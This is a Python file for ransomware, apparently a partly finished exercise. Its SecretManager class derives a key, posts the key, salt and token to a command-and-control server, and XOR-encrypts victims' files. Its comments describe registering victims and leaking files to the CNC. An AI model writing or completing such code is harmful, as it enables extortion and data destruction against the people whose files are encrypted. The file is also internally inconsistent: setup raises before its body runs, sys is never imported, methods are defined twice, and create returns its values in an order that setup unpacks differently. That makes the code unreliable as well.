from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64
import hashlib 

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile
from secrets import token_bytes

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        raise NotImplemented()


    def create(self)->Tuple[bytes, bytes, bytes]:
        raise NotImplemented()


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        raise NotImplemented()

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        raise NotImplemented()
        token_path = os.path.join(self._path, "token.bin")
        if os.path.exists(token_path):
            print("token.bin already exists. Exiting to avoid overwriting.")
            sys.exit(1)

        # Generate cryptographic elements
        salt, key, token = self.create()

        # Save salt and token locally
        salt_path = os.path.join(self._path, "salt.bin")
        with open(salt_path, "wb") as salt_file:
            salt_file.write(salt)

        with open(token_path, "wb") as token_file:
            token_file.write(token)

        # Send cryptographic elements to CNC
        self.post_new(salt, key, token)

    def load(self)->None:
        # function to load crypto data
        raise NotImplemented()

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        raise NotImplemented()

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        raise NotImplemented()

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        raise NotImplemented()

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        raise NotImplemented()

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()
    
    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.TOKEN_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
            backend=default_backend()
        )
        derived_key = kdf.derive(key)
        return derived_key

    def create(self)->Tuple[bytes, bytes, bytes]:
        key = token_bytes(self.KEY_LENGTH)
        salt = token_bytes(self.SALT_LENGTH)
        token = self.do_derivation(salt, key)
        return key, salt, token
    
    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
        payload = {
            "token": self.bin_to_b64(token),
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key)
        }
        url = f"http://{self._remote_host_port}/new"
        response = requests.post(url, json=payload)
        response.raise_for_status()

    def xorfiles(self, files: List[str]) -> None:
        for file in files:
            xorfile(file, self._key)

    def get_hex_token(self) -> str:
        token_hash = hashlib.sha256(self._token).hexdigest()
        return token_hash
    











